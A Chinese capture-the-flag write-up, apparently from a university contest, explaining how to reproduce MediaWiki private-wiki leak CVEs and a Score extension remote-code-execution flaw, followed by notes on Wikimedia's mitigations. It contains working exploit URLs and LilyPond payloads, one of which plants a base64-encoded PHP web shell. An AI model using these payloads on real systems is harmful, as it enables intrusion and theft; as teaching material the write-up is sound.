# [Web] 私有笔记

- 命题人：debugger
- 知识，与你分享：200 分
- 来我家做客吧：300 分

## 题目描述

<p>大家或许做过 Hackergame 2022 “Flag 的痕迹”一题，或许没做过，这不重要。</p>
<p>总之，<ruby>现在<rt>2020年</rt></ruby>小 Z 在自己的机器上部署了一个 MediaWiki 用于记录自己的笔记，把 Flag 放在里面，然后想方设法不让其他人看到。
但是，这次不仅 Flag 被泄漏了，黑客还在机器上干了更多坏事……</p>
<p>一些说明：</p>
<ol>
<li>此题和 Hackergame 的题目解法没有直接联系。</li>
<li>此题不是代码审计题，一开始就阅读源代码是错误的选择。</li>
</ol>
<div class="well">
<p><strong>第二阶段提示：</strong></p>
<ul>
<li>提供以下配置文件：<a target="_blank" rel="noopener noreferrer" href="/service/attachment/prob07/Dockerfile">Dockerfile</a>、<a target="_blank" rel="noopener noreferrer" href="/service/attachment/prob07/LocalSettings.php">LocalSettings.php</a>。</li>
<li>2021年12月，MediaWiki爆出<strong>一系列</strong>漏洞，允许攻击者访问私有 wiki 的任何内容，以及修改公开 wiki 的任何页面（例如维基百科的首页）。所幸，漏洞被发现并修复前没有造成已知的负面影响。</li>
<li>2020年7月，Score扩展爆出漏洞，允许攻击者执行任意命令。漏洞发现不久，Score扩展就在维基媒体计划禁用了。在此漏洞的修复过程中，又发现了一系列绕过方法。维基媒体计划的最终的处理方法是把LilyPond放到一个独立的容器运行；13个月后（2021年8月），Score扩展才被重新启用。</li>
<li>可以参考MediaWiki bug report system对相关漏洞的讨论。</li>
</ul>
</div>

**【网页链接：访问题目网页】**

**[【隐藏附件：Dockerfile】](attachment/Dockerfile)**

**[【隐藏附件：LocalSettings.php】](attachment/LocalSettings.php)**

## 预期解法

这是一道CVE复现题。

### Flag 1

在CVE网站[搜索MediaWiki private wiki](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=MediaWiki+private+wiki)就能找到Flag 1涉及的CVE，此外在MediaWiki官方网站的[MediaWiki 1.34页面](https://www.mediawiki.org/wiki/MediaWiki_1.34)也有向[漏洞描述](https://www.mediawiki.org/wiki/2021-12_security_release/FAQ)的链接。共有两个CVE和Flag 1相关：[CVE-2021-44858](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44858)、[CVE-2021-45038](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45038)，复现任何一个即可。从CVE的描述页面可以找到bug tracker里面的[相关](https://phabricator.wikimedia.org/T297322)[讨论](https://phabricator.wikimedia.org/T297574)，里面就有复现方法。

- CVE-2021-44858：<https://prob07-xxxxxxxx.geekgame.pku.edu.cn/index.php?title=%E9%A6%96%E9%A1%B5&action=mcrundo&undo=1&undoafter=2>、<https://prob07-xxxxxxxx.geekgame.pku.edu.cn/index.php?title=%E9%A6%96%E9%A1%B5&action=edit&undo=1&undoafter=2>（任选一个）
- CVE-2021-45038：<https://prob07-xxxxxxxx.geekgame.pku.edu.cn/index.php?action=rollback&from={{:flag}}>

拿到Flag 1后，需要用给的用户名和密码登录，然后才能进行下一步。

### Flag 2

如果打开<https://www.mediawiki.org/wiki/Extension:Score>，可以看到明显的[安全提示](https://www.mediawiki.org/wiki/Extension:Score/2021_security_advisory)，里面就涉及了本问的CVE。直接打开[CVE-2020-29007](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-29007)并不能看到该CVE的任何内容，因此还是要从[bug tracker的讨论](https://phabricator.wikimedia.org/T257062)获取相关信息。

首先里面提到了可以执行getpwuid函数。只要任意编辑一个页面，贴上下面的内容，然后点击显示预览，就能看到getpwuid的结果。

```xml
<score>\new Staff <<{c^#(object->string (getpwuid (getuid)))}>></score>
```

接着你可以发现有/var/www/html/index.php文件（这是apache网站首页的默认路径）。

```xml
<score>\new Staff <<{c^#(if (file-exists? "/var/www/html/index.php") "true" "false")}>></score>
```

接着，上传一个shell.php文件：

```xml
<score>\new Staff <<{c^#
(number->string (system "echo PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpeyBlY2hvICI8cHJlPiI7ICRjbWQgPSAoJF9SRVFVRVNUWydjbWQnXSk7IHN5c3RlbSgkY21kKTsgZWNobyAiPC9wcmU+IjsgZGllOyB9Pz4= | base64 -d > /var/www/html/shell.php"))
}>></score>
```

再打开<https://prob07-xxxxxxxx.geekgame.pku.edu.cn/shell.php?cmd=ls%20-l%20/>，就可以看到根目录下有flag2文件，并且也可以通过<https://prob07-xxxxxxxx.geekgame.pku.edu.cn/shell.php?cmd=cat%20/flag2>读出来。


### 附注

此题的idea爆出CVE不久就有了，不是因为Hackergame的题目才出了这道题。另外，本题早期版本在数据库里面还有个Flag 3，上传了shell之后把数据库拖下来就能看到。后来xmcp觉得有点白给所以删掉了。

2021年12月爆出的漏洞其实潜在影响非常严重。MediaWiki有一个[Common.js](https://zh.wikipedia.org/wiki/MediaWiki:Common.js)页面，上面放的JavaScript代码所有访问网站者都会执行，允许任何用户修改任何页面会导致任何用户可以在维基百科注入任何JavaScript代码。

Score的问题在维基媒体计划的场景实际上比题目描述的复杂得多。本来Score扩展有两种机制来加强安全性和阻止RCE（为了降低题目难度，本题并没有采用以下任何手段）：
1. 可以把LilyPond放在[firejail](https://github.com/netblue30/firejail)里面执行。firejail是一个SUID沙盒程序，使用Linux 命名空间、seccomp-bpf和Linux功能来限制不受信任的应用程序的运行环境以降低安全漏洞被利用的风险。 
2. LilyPond里面有一个安全模式，安全模式可以阻止使用system等不安全语法，但是安全模式只提供了部分功能，所以维基媒体选择不使用安全模式。

2020年7月，有用户发现维基媒体安装的Score可以RCE。检查发现，[启用firejail的配置名称写错](https://phabricator.wikimedia.org/T257062#6277460)，从而firejail没有启用。启用了firejail后，在测试和代码审计中又发现了更多问题：
1. LilyPond即使在安全模式可以执行任意PostScript代码（CVE-2020-17353），所以Score后来选择先运行LilyPond生成PostScript再用Ghostscript的安全模式生成图片。
2. firejail存在命令注入，可以实现RCE（CVE-2020-17367、CVE-2020-17368），所以需要过滤firejail的命令参数（后来维基媒体计划弃用了firejail，见下文）。
3. LilyPond存在安全模式绕过，也即在安全模式也有办法运行非安全的代码（CVE-2020-17354）。此问题LilyPond方面发现难以修复，所以LilyPond的新版本把安全模式整个移除了。

因为LilyPond的安全模式绕过难以修复，所以维基媒体计划目前的处理方法是把LilyPond移到了一个和服务器平行的容器运行（这样即使能在容器里面RCE也影响不到服务器），同时限制了容器的资源（用最小权限用户运行，并且限制使用的容器资源避免用户搅屎）。

